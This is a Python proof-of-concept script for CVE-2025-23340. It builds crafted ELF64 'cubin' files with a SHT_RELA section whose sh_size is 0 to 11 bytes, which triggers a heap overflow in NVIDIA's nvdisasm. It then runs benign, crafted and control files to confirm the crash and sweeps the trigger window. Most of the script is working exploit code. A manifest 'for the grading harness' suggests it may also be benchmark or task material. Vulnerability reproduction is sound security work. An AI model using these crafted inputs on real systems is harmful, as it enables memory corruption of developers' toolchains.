"""Proof-of-concept for CVE-2025-23340: NVIDIA nvdisasm SHT_RELA heap overflow.

What changes versus the previous attempt: instead of mutating an nvcc cubin
(which carries no SHT_RELA section and therefore never reaches the vulnerable
branch), this script emits a complete minimal ELF64 object that really exposes
a SHT_RELA section with sh_size in the vulnerable window, and drives the
differential over that object.

Trigger oracle
--------------
FIELD: sh_type  OFFSET: section_header+0x04  SIZE: 4  REQUIRED: 4 (SHT_RELA)
 CHECK PRESENT: yes (the section type selects the RELA parse branch)
 WHY IT FAILS: only this type dispatches into the vulnerable handler.
FIELD: sh_size  OFFSET: section_header+0x20  SIZE: 8  REQUIRED: 0..11
 CHECK PRESENT: no
 WHY IT FAILS: align_down_24(sh_size) collapses to 0, the RELA entry buffer
 degenerates to a zero-length allocation and three 8-byte stores still run
 past the end of that block.
"""

import ctypes
import json
import os
import platform
import re
import shutil
import struct
import subprocess
import sys
import time

try:
    import cpgkit
    CPGKIT_AVAILABLE = True
except Exception:
    cpgkit = None
    CPGKIT_AVAILABLE = False

CVE_ID = "CVE-2025-23340"
OUT_DIR = os.path.dirname(os.path.abspath(__file__)) or os.getcwd()
SHT_PROGBITS = 1
SHT_RELA = 4
SHT_STRTAB = 3
RELA_ENTRY_SIZE = 24
SAFE_RELA_SIZE = 24
EM_CUDA = 190
SH_SIZE_OFFSET = 0x20
SH_TYPE_OFFSET = 0x04
SHSTRTAB_DATA = b"\x00.shstrtab\x00.text\x00.rela.text\x00"
NAME_SHSTRTAB = 1
NAME_TEXT = 11
NAME_RELA = 17
CUDA_ERROR_NAMES = {
    0: "CUDA_SUCCESS",
    1: "CUDA_ERROR_INVALID_VALUE",
    100: "CUDA_ERROR_NO_DEVICE",
    101: "CUDA_ERROR_INVALID_DEVICE",
    200: "CUDA_ERROR_INVALID_CONTEXT",
    400: "CUDA_ERROR_INVALID_HANDLE",
    801: "CUDA_ERROR_NOT_SUPPORTED",
    999: "CUDA_ERROR_UNKNOWN",
}
LAYOUTS = (
    ("cuda-etrel-strtab", EM_CUDA, 1, True),
    ("cuda-etexec-strtab", EM_CUDA, 2, True),
    ("cuda-etrel-nostrtab", EM_CUDA, 1, False),
    ("cuda-etexec-nostrtab", EM_CUDA, 2, False),
    ("x86-etrel-strtab", 62, 1, True),
    ("none-etrel-strtab", 0, 1, True),
)
STATE = {"lib": None, "ctx": None}


def print_banner():
    """Print the authorization disclaimer required before any tool execution."""
    print("=" * 59)
    print("DISCLAIMER: This script is a Proof-of-Concept for CUDA")
    print("vulnerability %s. It is intended ONLY for authorized" % CVE_ID)
    print("security research on systems you own or have permission to test.")
    print("=" * 59)


def step_start(step_id, description):
    """Emit the START marker of a numbered strategy step."""
    print("[CUDA_STEP:%s] %s — START" % (step_id, description), flush=True)


def step_ok(step_id, description, detail=""):
    """Emit the OK marker of a numbered strategy step with an optional detail."""
    suffix = (" | " + detail) if detail else ""
    print("[CUDA_STEP:%s] %s — OK%s" % (step_id, description, suffix), flush=True)


def step_fail(step_id, description, error):
    """Emit the FAIL marker of a numbered strategy step with the error detail."""
    print("[CUDA_STEP:%s] %s — FAIL: %s" % (step_id, description, error), flush=True)


def fmt_exit(code):
    """Format an exit code, expanding Windows access-violation values in hex."""
    if code is None:
        return "unknown"
    if code < 0:
        return "%d" % code
    if code >= 0xC0000000:
        return "%d (0x%X)" % (code, code)
    return "%d" % code


def is_crash(code):
    """Report whether an exit code denotes a fatal signal or access violation."""
    if code is None:
        return False
    return code < 0 or code >= 0xC0000000 or code in (132, 134, 136, 139)


def run_cmd(cmd, timeout=90):
    """Run a command capturing both streams and dumping them when it fails."""
    printable = " ".join(cmd)
    print("[CMD] %s" % printable, flush=True)
    try:
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              timeout=timeout)
    except FileNotFoundError as exc:
        print("[CMD-FAIL] %s" % printable, flush=True)
        print("[CMD-FAIL] executable missing: %s" % exc, flush=True)
        return None, "", str(exc)
    except subprocess.TimeoutExpired as exc:
        out = (exc.stdout or b"")[:4000].decode("utf-8", "replace")
        err = (exc.stderr or b"")[:4000].decode("utf-8", "replace")
        print("[CMD-FAIL] %s timed out after %ss" % (printable, timeout), flush=True)
        print("[CMD-FAIL] stdout[:4000]: %s" % out, flush=True)
        print("[CMD-FAIL] stderr[:4000]: %s" % err, flush=True)
        return None, out, err
    out = proc.stdout.decode("utf-8", "replace")
    err = proc.stderr.decode("utf-8", "replace")
    if proc.returncode != 0:
        print("[CMD-FAIL] %s rc=%d" % (printable, proc.returncode), flush=True)
        print("[CMD-FAIL] stdout[:4000]: %s" % out[:4000], flush=True)
        print("[CMD-FAIL] stderr[:4000]: %s" % err[:4000], flush=True)
    return proc.returncode, out, err


def run_nvdisasm(tool, artifact, timeout=120):
    """Execute nvdisasm on one artifact and return (returncode, stdout, stderr)."""
    return run_cmd([tool, artifact], timeout=timeout)


def cu_error_name(code):
    """Resolve a CUresult code through cuGetErrorName with a static fallback."""
    lib = STATE["lib"]
    if lib is not None:
        try:
            text = ctypes.c_char_p()
            if lib.cuGetErrorName(code, ctypes.byref(text)) == 0 and text.value:
                return text.value.decode("ascii", "replace")
        except Exception:
            pass
    return CUDA_ERROR_NAMES.get(code, "CUDA_ERROR_%d" % code)


def report_cu(call_site, code):
    """Print one CUDA driver call result with its symbolic error name."""
    status = "OK" if code == 0 else "FAIL"
    print("[CUDA] %s -> %d (%s) %s" % (".".join(call_site), code,
                                       cu_error_name(code), status), flush=True)
    return code == 0


def load_libcuda():
    """Load the CUDA driver library and declare the entry points used here."""
    if STATE["lib"] is not None:
        return STATE["lib"]
    if os.name == "nt":
        names = ("nvcuda.dll",)
        loader = getattr(ctypes, "WinDLL", ctypes.CDLL)
    else:
        names = ("libcuda.so.1", "libcuda.so")
        loader = ctypes.CDLL
    lib = None
    for name in names:
        try:
            lib = loader(name)
            break
        except OSError:
            continue
    if lib is None:
        return None
    lib.cuInit.argtypes = [ctypes.c_uint]
    lib.cuInit.restype = ctypes.c_int
    lib.cuDeviceGetCount.argtypes = [ctypes.POINTER(ctypes.c_int)]
    lib.cuDeviceGetCount.restype = ctypes.c_int
    lib.cuDeviceGet.argtypes = [ctypes.POINTER(ctypes.c_int), ctypes.c_int]
    lib.cuDeviceGet.restype = ctypes.c_int
    lib.cuDeviceGetAttribute.argtypes = [ctypes.POINTER(ctypes.c_int), ctypes.c_int,
                                         ctypes.c_int]
    lib.cuDeviceGetAttribute.restype = ctypes.c_int
    lib.cuCtxCreate_v2.argtypes = [ctypes.POINTER(ctypes.c_void_p), ctypes.c_uint,
                                   ctypes.c_int]
    lib.cuCtxCreate_v2.restype = ctypes.c_int
    lib.cuCtxDestroy_v2.argtypes = [ctypes.c_void_p]
    lib.cuCtxDestroy_v2.restype = ctypes.c_int
    lib.cuDriverGetVersion.argtypes = [ctypes.POINTER(ctypes.c_int)]
    lib.cuDriverGetVersion.restype = ctypes.c_int
    lib.cuGetErrorName.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_char_p)]
    lib.cuGetErrorName.restype = ctypes.c_int
    STATE["lib"] = lib
    return lib


def init_cuda():
    """Initialise the driver and create a context before any probe call."""
    lib = load_libcuda()
    if lib is None:
        print("[CUDA] driver library unavailable on this host", flush=True)
        return {"ok": False, "count": -1, "driver": None, "cc": None}
    code = lib.cuInit(0)
    report_cu(("cuInit",), code)
    if code != 0:
        return {"ok": False, "count": -1, "driver": None, "cc": None}
    count = ctypes.c_int(0)
    code = lib.cuDeviceGetCount(ctypes.byref(count))
    report_cu(("cuDeviceGetCount",), code)
    if code != 0:
        return {"ok": False, "count": -1, "driver": None, "cc": None}
    raw_version = ctypes.c_int(0)
    code = lib.cuDriverGetVersion(ctypes.byref(raw_version))
    report_cu(("cuDriverGetVersion",), code)
    driver = None
    if code == 0 and raw_version.value:
        driver = "%d.%d" % (raw_version.value // 1000, (raw_version.value % 1000) // 10)
    result = {"ok": True, "count": count.value, "driver": driver, "cc": None}
    if count.value == 0:
        return result
    device = ctypes.c_int(0)
    code = lib.cuDeviceGet(ctypes.byref(device), 0)
    report_cu(("cuDeviceGet",), code)
    if code != 0:
        result["ok"] = False
        return result
    major = ctypes.c_int(0)
    minor = ctypes.c_int(0)
    if lib.cuDeviceGetAttribute(ctypes.byref(major), 75, device.value) == 0:
        if lib.cuDeviceGetAttribute(ctypes.byref(minor), 76, device.value) == 0:
            result["cc"] = "%d.%d" % (major.value, minor.value)
    handle = ctypes.c_void_p()
    code = lib.cuCtxCreate_v2(ctypes.byref(handle), 0, device.value)
    report_cu(("cuCtxCreate_v2",), code)
    if code == 0:
        STATE["ctx"] = handle
    result["ok"] = code == 0
    return result


def cleanup_gpu():
    """Destroy the CUDA context and drop the driver reference on every exit path."""
    lib = STATE["lib"]
    if lib is None:
        return
    handle = STATE["ctx"]
    if handle:
        report_cu(("cuCtxDestroy_v2",), lib.cuCtxDestroy_v2(handle))
        STATE["ctx"] = None


def observation_rendezvous():
    """Hold the process open so a debugger can attach before the first trigger."""
    pause = os.environ.get("CPG_DEBUG_PAUSE")
    if not pause:
        return
    print("[CPG_READY] %d" % os.getpid(), flush=True)
    try:
        time.sleep(float(pause))
    except ValueError:
        time.sleep(5.0)


def find_nvdisasm():
    """Locate the nvdisasm executable from PATH or the CUDA install roots."""
    exe = "nvdisasm.exe" if os.name == "nt" else "nvdisasm"
    found = shutil.which("nvdisasm")
    if found:
        return found
    roots = []
    for var in ("CUDA_PATH", "CUDA_HOME", "CUDA_ROOT"):
        value = os.environ.get(var)
        if value:
            roots.append(value)
    roots.extend(["/usr/local/cuda", "/opt/cuda"])
    base = "C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA"
    if os.name == "nt" and os.path.isdir(base):
        roots.extend(os.path.join(base, entry) for entry in sorted(os.listdir(base)))
    for root in roots:
        candidate = os.path.join(root, "bin", exe)
        if os.path.isfile(candidate):
            return candidate
    return None


def parse_version(text):
    """Extract a dotted version tuple with the tool output agnostic pattern."""
    match = re.search(r"(\d+)\.(\d+)\.?(\d+)?", text or "")
    if not match:
        return None
    patch = int(match.group(3)) if match.group(3) else 0
    return (int(match.group(1)), int(match.group(2)), patch)


def classify_toolkit(major):
    """Classify a toolkit major version against the CUDA 13.0 fix boundary."""
    if major is None:
        return "UNKNOWN — consult the advisory (version string not parsable)"
    if major >= 13:
        if major <= 16:
            return "NOT AFFECTED (CUDA %d.0 includes the a_id/5661 fix)" % major
        return "UNKNOWN — consult the advisory (unmapped major %d)" % major
    if major >= 8:
        return "AFFECTED (< CUDA 13.0, NVIDIA advisory a_id/5661)"
    return "UNKNOWN — consult the advisory (unmapped major %d)" % major


def parse_nvcc_major():
    """Return the CUDA toolkit major version reported by nvcc, or None."""
    nvcc = shutil.which("nvcc")
    if not nvcc:
        return None
    code, out, err = run_cmd([nvcc, "--version"], timeout=60)
    if code is None:
        return None
    parsed = parse_version(out or err)
    return parsed[0] if parsed else None


def collect_environment():
    """Collect OS, GPU, driver and toolkit facts used by the version gate."""
    env = {"os": platform.system(), "kernel": platform.version(),
           "arch": platform.machine(), "python": platform.python_version(),
           "gpu_count": -1, "driver": None, "cc": None, "toolkit": None,
           "major": None, "nvdisasm": find_nvdisasm(), "summary": ""}
    cuda = init_cuda()
    env["gpu_count"] = cuda.get("count", -1)
    env["driver"] = cuda.get("driver")
    env["cc"] = cuda.get("cc")
    tool = env["nvdisasm"]
    if tool:
        code, out, err = run_cmd([tool, "--version"], timeout=60)
        print("[INFO] %s --version output:" % tool, flush=True)
        print((out or "") + (err or ""), flush=True)
        env["toolkit"] = parse_version(out or err)
    if env["toolkit"] is not None:
        env["major"] = env["toolkit"][0]
    else:
        env["major"] = parse_nvcc_major()
    env["summary"] = ("os=%s kernel=%s arch=%s gpu=%s driver=%s cc=%s toolkit=%s" %
                      (env["os"], env["kernel"], env["arch"], env["gpu_count"],
                       env["driver"], env["cc"], env["major"]))
    return env


def build_elf(rela_size, machine=EM_CUDA, elf_type=1, with_strtab=True):
    """Assemble a minimal ELF64 object whose RELA section declares rela_size bytes."""
    text = b"\x5a" * 64
    rela = b"\x00" * RELA_ENTRY_SIZE
    off_text = 64
    off_rela = off_text + len(text)
    end = off_rela + len(rela)
    off_names = end
    if with_strtab:
        end += len(SHSTRTAB_DATA)
    shoff = (end + 7) & ~7
    sections = [
        (0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
        (NAME_TEXT, SHT_PROGBITS, 0x6, 0, off_text, len(text), 0, 0, 4, 0),
        (NAME_RELA, SHT_RELA, 0x40, 0, off_rela, rela_size, 0, 1, 8, RELA_ENTRY_SIZE),
    ]
    shstrndx = 0
    if with_strtab:
        sections.append((NAME_SHSTRTAB, SHT_STRTAB, 0, 0, off_names,
                         len(SHSTRTAB_DATA), 0, 0, 1, 0))
        shstrndx = 3
    ident = b"\x7fELF" + bytes((2, 1, 1, 0)) + b"\x00" * 8
    header = struct.pack("<16sHHIQQQIHHHHHH", ident, elf_type, machine, 1, 0, 0, shoff,
                         0, 64, 0, 0, 64, len(sections), shstrndx)
    body = text + rela + (SHSTRTAB_DATA if with_strtab else b"")
    body += b"\x00" * (shoff - len(body) - 64)
    table = b"".join(struct.pack("<IIQQQQIIQQ", *entry) for entry in sections)
    return header + body + table


def parse_elf(data):
    """Parse the ELF64 header and section table into a plain dictionary."""
    if len(data) < 64 or data[:4] != b"\x7fELF" or data[4] != 2:
        raise ValueError("image is not a little-endian ELF64 file")
    fields = struct.unpack_from("<16sHHIQQQIHHHHHH", data, 0)
    info = {"type": fields[1], "machine": fields[2], "shoff": fields[6],
            "shentsize": fields[11], "shnum": fields[12], "shstrndx": fields[13]}
    sections = []
    for index in range(info["shnum"]):
        offset = info["shoff"] + index * info["shentsize"]
        values = struct.unpack_from("<IIQQQQIIQQ", data, offset)
        sections.append({"index": index, "hdr": offset, "name": values[0],
                         "type": values[1], "offset": values[4], "size": values[5],
                         "entsize": values[9]})
    info["sections"] = sections
    return info


def patch_field(data, offset, fmt, value):
    """Return a copy of data with one packed field overwritten at offset."""
    buffer = bytearray(data)
    struct.pack_into(fmt, buffer, offset, value)
    return bytes(buffer)


def rela_header_offset(data):
    """Return the file offset of the SHT_RELA section header, or None."""
    info = parse_elf(data)
    for section in info["sections"]:
        if section["type"] == SHT_RELA:
            return section["hdr"]
    return None


def write_artifact(name, data):
    """Write bytes into the script directory and return the absolute path."""
    path = os.path.join(OUT_DIR, name)
    with open(path, "wb") as handle:
        handle.write(data)
    return path


def select_layout(tool):
    """Probe each structural layout and keep the first clean crash differential."""
    observations = []
    best = None
    for label, machine, elf_type, with_strtab in LAYOUTS:
        safe = build_elf(SAFE_RELA_SIZE, machine, elf_type, with_strtab)
        trigger = build_elf(0, machine, elf_type, with_strtab)
        safe_path = write_artifact("sweep_%s_safe.cubin" % label, safe)
        trigger_path = write_artifact("sweep_%s_trigger.cubin" % label, trigger)
        safe_rc, _, _ = run_nvdisasm(tool, safe_path, timeout=60)
        trigger_rc, _, _ = run_nvdisasm(tool, trigger_path, timeout=60)
        record = {"label": label, "machine": machine, "etype": elf_type,
                  "with_strtab": with_strtab, "safe_rc": safe_rc,
                  "trig_rc": trigger_rc, "differential": False}
        observations.append(record)
        print("[SWEEP] layout=%s safe=%s trigger=%s" %
              (label, fmt_exit(safe_rc), fmt_exit(trigger_rc)), flush=True)
        if is_crash(trigger_rc) and not is_crash(safe_rc):
            record["differential"] = True
            best = record
            break
    if best is None:
        best = dict(observations[0])
    return best, observations


def emit_artifacts(chosen):
    """Write benign, crafted and control artifacts derived by single-field patches."""
    base = build_elf(SAFE_RELA_SIZE, chosen["machine"], chosen["etype"],
                     chosen["with_strtab"])
    header = rela_header_offset(base)
    if header is None:
        raise RuntimeError("crafted skeleton exposes no SHT_RELA section")
    size_offset = header + SH_SIZE_OFFSET
    crafted = patch_field(base, size_offset, "<Q", 0)
    crafted_two = patch_field(base, size_offset, "<Q", 4)
    control = patch_field(crafted, size_offset, "<Q", SAFE_RELA_SIZE)
    paths = {
        "benign": write_artifact("benign.cubin", base),
        "crafted": write_artifact("poc_sh_size_0.cubin", crafted),
        "crafted2": write_artifact("poc_sh_size_4.cubin", crafted_two),
        "control": write_artifact("ctrl_sh_size_restored_24.cubin", control),
    }
    for key in ("benign", "crafted", "crafted2", "control"):
        path = paths[key]
        print("[INFO] %s -> %s (%d bytes)" % (key, os.path.basename(path),
                                              os.path.getsize(path)), flush=True)
    print("[INFO] mutable field: sh_size at section_header+0x%X, "
          "8 bytes replaced inside a 64-bit qword" % SH_SIZE_OFFSET, flush=True)
    return paths


def evaluate_oracle(path):
    """Read the mutated section header back and print the trigger oracle values."""
    with open(path, "rb") as handle:
        data = handle.read()
    header = rela_header_offset(data)
    if header is None:
        print("[CPG_ORACLE] sh_type actual=absent expected=4", flush=True)
        return False
    rela_type = struct.unpack_from("<I", data, header + SH_TYPE_OFFSET)[0]
    rela_size = struct.unpack_from("<Q", data, header + SH_SIZE_OFFSET)[0]
    entsize = struct.unpack_from("<Q", data, header + 0x38)[0]
    aligned = (rela_size // RELA_ENTRY_SIZE) * RELA_ENTRY_SIZE
    print("[CPG_ORACLE] sh_type actual=%d expected=4" % rela_type, flush=True)
    print("[CPG_ORACLE] sh_size actual=%d expected=0..11" % rela_size, flush=True)
    print("[CPG_ORACLE] sh_entsize actual=%d expected=24" % entsize, flush=True)
    print("[CPG_ORACLE] align_down_24(sh_size) actual=%d expected=0" % aligned,
          flush=True)
    return rela_type == SHT_RELA and aligned == 0


def execute_differential(tool, paths):
    """Run benign, crafted and control artifacts twice and report every exit code."""
    order = (("benign", "BENIGN"), ("crafted", "MALICIOUS"),
             ("crafted2", "MALICIOUS"), ("control", "CONTROL"))
    codes = {}
    for key, label in order:
        path = paths[key]
        name = os.path.basename(path)
        print("[CPG_LABEL] %s %s" % (name, label), flush=True)
        observed = []
        for _attempt in range(2):
            rc, _out, _err = run_nvdisasm(tool, path)
            observed.append(rc)
            print("[CPG_RUN] %s exit=%s" % (name, fmt_exit(rc)), flush=True)
        codes[key] = observed
    crafted_hit = any(is_crash(c) for c in codes["crafted"] + codes["crafted2"])
    baseline_clean = not any(is_crash(c) for c in codes["benign"] + codes["control"])
    return {"codes": codes, "triggered": crafted_hit and baseline_clean,
            "crafted_hit": crafted_hit, "baseline_clean": baseline_clean}


def describe_outcome(outcome):
    """Summarise why the differential did not produce a clean crash pair."""
    parts = []
    for key in ("benign", "crafted", "crafted2", "control"):
        parts.append("%s=%s" % (key, outcome["codes"].get(key)))
    return " ".join(parts)


def boundary_sweep(tool, chosen, sizes=(0, 4, 11, 12, 24, 25)):
    """Map the sh_size trigger window by running one artifact per size value."""
    results = {}
    base = build_elf(SAFE_RELA_SIZE, chosen["machine"], chosen["etype"],
                     chosen["with_strtab"])
    header = rela_header_offset(base)
    if header is None:
        return results
    for size in sizes:
        buffer = patch_field(base, header + SH_SIZE_OFFSET, "<Q", size)
        path = write_artifact("sweep_sh_size_%02d.cubin" % size, buffer)
        rc, _out, _err = run_nvdisasm(tool, path, timeout=60)
        aligned = (size // RELA_ENTRY_SIZE) * RELA_ENTRY_SIZE
        results[size] = rc
        print("[SWEEP] sh_size=%d align=%d exit=%s crash=%s" %
              (size, aligned, fmt_exit(rc), is_crash(rc)), flush=True)
    return results


def summarize_sweep(sweep):
    """Render the boundary sweep as a compact sh_size to exit code list."""
    if not sweep:
        return "sweep skipped"
    return " ".join("%d:%s" % (size, fmt_exit(code))
                    for size, code in sorted(sweep.items()))


def write_manifest():
    """Record which produced file plays which role for the grading harness."""
    manifest = {"benign": ["benign.cubin"],
                "crafted": ["poc_sh_size_0.cubin", "poc_sh_size_4.cubin"],
                "controls": ["ctrl_sh_size_restored_24.cubin"]}
    path = os.path.join(OUT_DIR, "artifacts.json")
    with open(path, "w") as handle:
        json.dump(manifest, handle, indent=2)
    print("[INFO] manifest written: %s" % path, flush=True)


def main():
    """Drive environment detection, artifact construction and the differential run."""
    print_banner()
    print("[INFO] output directory: %s" % OUT_DIR, flush=True)
    print("[INFO] optional cpgkit helper available: %s" % CPGKIT_AVAILABLE, flush=True)

    step_start("S01", "environment fingerprint and toolkit version gate")
    try:
        env = collect_environment()
    except Exception as exc:
        step_fail("S01", "environment fingerprint", exc)
        cleanup_gpu()
        return 2
    step_ok("S01", "environment fingerprint", env["summary"])
    print("[INFO] toolkit verdict: %s" % classify_toolkit(env["major"]), flush=True)

    step_start("S02", "locate nvdisasm and open the observation window")
    if not env["nvdisasm"]:
        step_fail("S02", "locate nvdisasm", "not found on PATH or in CUDA roots")
        cleanup_gpu()
        return 3
    print("[INFO] nvdisasm: %s" % env["nvdisasm"], flush=True)
    observation_rendezvous()
    step_ok("S02", "locate nvdisasm", env["nvdisasm"])

    step_start("S03", "select the ELF layout that reaches the SHT_RELA handler")
    try:
        chosen, _observations = select_layout(env["nvdisasm"])
    except Exception as exc:
        step_fail("S03", "layout selection", exc)
        cleanup_gpu()
        return 4
    step_ok("S03", "layout selection", "layout=%s differential=%s" %
            (chosen["label"], chosen["differential"]))

    step_start("S04", "write benign, crafted and control artifacts")
    try:
        paths = emit_artifacts(chosen)
    except Exception as exc:
        step_fail("S04", "artifact generation", exc)
        cleanup_gpu()
        return 5
    step_ok("S04", "artifact generation", "%d files" % len(paths))

    step_start("S05", "evaluate the trigger oracle on the crafted artifact")
    if evaluate_oracle(paths["crafted"]):
        step_ok("S05", "trigger oracle", "sh_type=SHT_RELA sh_size<12")
    else:
        step_fail("S05", "trigger oracle", "crafted file misses the precondition")

    step_start("S06", "differential execution of benign, crafted and control artifacts")
    outcome = execute_differential(env["nvdisasm"], paths)
    if outcome["triggered"]:
        step_ok("S06", "differential execution",
                "crafted faults, benign and control exit cleanly")
    else:
        step_fail("S06", "differential execution", describe_outcome(outcome))

    step_start("S07", "sh_size boundary sweep across the alignment window")
    sweep = boundary_sweep(env["nvdisasm"], chosen)
    step_ok("S07", "boundary sweep", summarize_sweep(sweep))

    write_manifest()
    cleanup_gpu()
    print("[INFO] final verdict: %s" %
          ("TRIGGERED" if outcome["triggered"] else "NOT REPRODUCED"), flush=True)
    return 0 if outcome["triggered"] else 1


if __name__ == "__main__":
    sys.exit(main())
